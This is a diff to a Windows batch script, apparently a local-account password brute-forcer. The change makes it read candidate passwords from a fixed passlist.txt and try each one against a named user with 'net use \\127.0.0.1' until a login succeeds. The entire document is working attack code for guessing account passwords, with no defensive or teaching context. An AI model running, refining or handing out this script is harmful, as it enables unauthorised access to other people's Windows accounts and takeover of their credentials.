@@ -7,7 +7,6 @@ cls
 set error=-
 color F
 set user=""
-set wordlist=""
 echo.
 echo      ___.                 __          _____                           
 echo      \_ ^|_________ __ ___/  ^|_  _____/ ____\___________   ____  ____  
@@ -49,9 +48,13 @@ echo.
 echo [TARGET USER]
 set /p user=">> "
 echo.
-echo [PASSWORD LIST]
-set /p wordlist=">> "
-if not exist "%wordlist%" echo. && echo [91m[%error%][0m [97mFile not found[0m && pause >nul && goto start
+set wordlist=passlist.txt
+if not exist "%wordlist%" (
+  echo.
+  echo [91m[%error%][0m [97mFile not found[0m
+  pause >nul
+  goto start
+)
 net user %user% >nul 2>&1
 if /I "%errorlevel%" NEQ "0" (
   echo.
@@ -81,9 +84,11 @@ pause >nul
 goto start
 
 :varset
-net use \\127.0.0.1 /user:%user% %pass% 2>&1 | find "System error 1331" >nul
-echo [ATTEMPT %count%] [%pass%]
-set /a count=%count%+1
+net use \\127.0.0.1 /user:%user% %pass% >nul 2>&1
 if /I "%errorlevel%" EQU "0" goto success
 net use | find "\\127.0.0.1" >nul
-if /I "%errorlevel%" EQU "0" goto success 
+if /I "%errorlevel%" EQU "0" goto success
+set /a count=%count%+1
+goto :eof
+
+goto start
